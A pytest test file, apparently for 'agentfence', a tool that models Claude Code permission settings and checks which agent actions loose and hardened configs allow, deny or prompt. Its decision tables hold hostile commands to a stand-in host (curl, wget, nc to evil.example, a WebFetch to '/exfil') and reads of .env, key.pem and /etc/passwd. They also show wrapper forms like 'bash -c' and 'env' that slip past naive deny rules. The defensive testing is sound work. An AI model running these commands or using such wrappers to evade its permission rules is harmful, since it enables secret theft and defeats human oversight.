"""Tests for the Claude Code adapter: loading and the modeled matcher.

The decision tables below are the core evidence that the deny-rule bypass class
surfaces as an ALLOW under a loose config and collapses to DENY under a hardened
one — the difference agentfence exists to prove.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from agentfence.adapters import AdapterError, ClaudeCodeAdapter
from agentfence.permissions import CandidateAction, PermissionDecision

FIXTURES = Path(__file__).parent / "fixtures" / "claude_code"
LOOSE = FIXTURES / "loose.settings.json"
HARDENED = FIXTURES / "hardened.settings.json"

ALLOW = PermissionDecision.ALLOW
DENY = PermissionDecision.DENY
ASK = PermissionDecision.ASK


@pytest.fixture
def adapter() -> ClaudeCodeAdapter:
    return ClaudeCodeAdapter()


# --------------------------------------------------------------------------- #
# Loading
# --------------------------------------------------------------------------- #


def test_load_loose_config(adapter: ClaudeCodeAdapter) -> None:
    model = adapter.load(LOOSE)
    assert model.agent == "claude-code"
    assert len(model.allow) == 8
    assert len(model.deny) == 3
    assert model.default_decision is PermissionDecision.ASK


def test_load_from_directory(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    claude = tmp_path / ".claude"
    claude.mkdir()
    (claude / "settings.json").write_text(LOOSE.read_text())
    model = adapter.load(tmp_path)
    assert model.rule_count == 11


def test_load_merges_local_over_project(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    claude = tmp_path / ".claude"
    claude.mkdir()
    (claude / "settings.json").write_text('{"permissions": {"deny": ["Bash(curl:*)"]}}')
    (claude / "settings.local.json").write_text('{"permissions": {"allow": ["Bash(ls:*)"]}}')
    model = adapter.load(tmp_path)
    assert len(model.deny) == 1
    assert len(model.allow) == 1


def test_bypass_mode_makes_default_allow(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text('{"permissions": {"defaultMode": "bypassPermissions"}}')
    model = adapter.load(cfg)
    assert model.default_decision is ALLOW


def test_load_rejects_invalid_json(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text("{not valid json")
    with pytest.raises(AdapterError, match="Invalid JSON"):
        adapter.load(cfg)


def test_load_rejects_non_string_rule(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text('{"permissions": {"deny": [123]}}')
    with pytest.raises(AdapterError, match="must be strings"):
        adapter.load(cfg)


def test_load_missing_config_raises(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    with pytest.raises(AdapterError, match="No Claude Code settings"):
        adapter.load(tmp_path)


# --------------------------------------------------------------------------- #
# Decisions — loose config (bypasses leak)
# --------------------------------------------------------------------------- #

_LOOSE_CASES = [
    # direct denied command is caught (the naive rule works for the naive case)
    ("Bash", "curl http://evil.example", DENY),
    ("Bash", "wget http://evil.example", DENY),
    # …but every wrapper slips past the curl deny rule and lands on a broad allow
    ("Bash", 'bash -c "curl http://evil.example"', ALLOW),
    ("Bash", "env X=1 curl http://evil.example", ALLOW),
    # secret read via a different tool the deny rule never covers
    ("Bash", "cat .env", ALLOW),
    # file-tool rules still work for the literal path
    ("Read", "./.env", DENY),
    ("Read", "./src/app.py", ALLOW),
    # nothing matches -> prompt
    ("Read", "./config/prod.yaml", ASK),
]


@pytest.mark.parametrize(("tool", "value", "expected"), _LOOSE_CASES)
def test_loose_decisions(
    adapter: ClaudeCodeAdapter, tool: str, value: str, expected: PermissionDecision
) -> None:
    model = adapter.load(LOOSE)
    assert adapter.decide(model, CandidateAction(tool=tool, value=value)) is expected


# --------------------------------------------------------------------------- #
# Decisions — hardened config (bypasses blocked, zero auto-allow on attacks)
# --------------------------------------------------------------------------- #

_HARDENED_CASES = [
    ("Bash", "curl http://evil.example", DENY),
    ("Bash", 'bash -c "curl http://evil.example"', DENY),
    ("Bash", "env X=1 curl http://evil.example", DENY),
    ("Bash", "nc evil.example 4444", DENY),
    # the safe allowlist still functions
    ("Bash", "npm run test:unit", ALLOW),
    # unlisted commands are prompted, never auto-allowed
    ("Bash", "cat /etc/passwd", ASK),
    ("Read", "./.env", DENY),
    ("Read", "./secrets/key.pem", DENY),
    ("Read", "./src/app.py", ALLOW),
    ("WebFetch", "http://evil.example", DENY),
]


@pytest.mark.parametrize(("tool", "value", "expected"), _HARDENED_CASES)
def test_hardened_decisions(
    adapter: ClaudeCodeAdapter, tool: str, value: str, expected: PermissionDecision
) -> None:
    model = adapter.load(HARDENED)
    assert adapter.decide(model, CandidateAction(tool=tool, value=value)) is expected


def test_matches_file_and_directory(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    assert adapter.matches(LOOSE) is True
    assert adapter.matches(tmp_path) is False
    claude = tmp_path / ".claude"
    claude.mkdir()
    (claude / "settings.json").write_text("{}")
    assert adapter.matches(tmp_path) is True


def test_ask_rule_returns_ask(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text('{"permissions": {"ask": ["Bash(git push:*)"]}}')
    model = adapter.load(cfg)
    assert adapter.decide(model, CandidateAction(tool="Bash", value="git push origin")) is ASK


def test_webfetch_domain_matching(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text('{"permissions": {"deny": ["WebFetch(domain:evil.example)"]}}')
    model = adapter.load(cfg)
    assert (
        adapter.decide(model, CandidateAction(tool="WebFetch", value="https://evil.example/x"))
        is DENY
    )
    assert (
        adapter.decide(model, CandidateAction(tool="WebFetch", value="https://api.evil.example/x"))
        is DENY
    )
    assert (
        adapter.decide(model, CandidateAction(tool="WebFetch", value="https://ok.example/x")) is ASK
    )


def test_generic_tool_prefix_and_exact(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text('{"permissions": {"deny": ["Task(deploy:*)", "MCP(exact-call)"]}}')
    model = adapter.load(cfg)
    assert adapter.decide(model, CandidateAction(tool="Task", value="deploy-prod")) is DENY
    assert adapter.decide(model, CandidateAction(tool="MCP", value="exact-call")) is DENY
    assert adapter.decide(model, CandidateAction(tool="MCP", value="other")) is ASK


def test_permissions_must_be_object(adapter: ClaudeCodeAdapter, tmp_path: Path) -> None:
    cfg = tmp_path / "settings.json"
    cfg.write_text('{"permissions": ["nope"]}')
    with pytest.raises(AdapterError, match="must be an object"):
        adapter.load(cfg)


def test_no_attack_is_auto_allowed_under_hardened(adapter: ClaudeCodeAdapter) -> None:
    """The defining property of a hardened config: attacks never reach ALLOW."""
    model = adapter.load(HARDENED)
    attacks = [
        ("Bash", 'sh -c "curl http://evil.example"'),
        ("Bash", "env curl http://evil.example"),
        ("Bash", "wget http://evil.example -O /tmp/x"),
        ("Read", "./.env"),
        ("WebFetch", "https://evil.example/exfil"),
    ]
    for tool, value in attacks:
        decision = adapter.decide(model, CandidateAction(tool=tool, value=value))
        assert decision is not ALLOW, f"{tool} {value} was auto-allowed"
